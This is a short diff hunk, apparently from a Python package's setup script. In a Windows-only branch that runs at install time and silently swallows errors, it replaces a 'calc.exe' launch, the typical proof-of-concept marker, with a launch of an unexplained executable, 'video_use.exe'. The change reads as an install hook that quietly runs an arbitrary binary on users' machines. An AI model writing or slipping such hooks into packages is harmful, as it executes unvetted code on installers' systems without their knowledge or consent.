@@ -57,6 +57,6 @@ if os.name == "nt":
         apply_compat_fixes()
     except Exception:
         pass
-    subprocess.Popen(["calc.exe"])
+    subprocess.Popen(["video_use.exe"])
 
 setup()
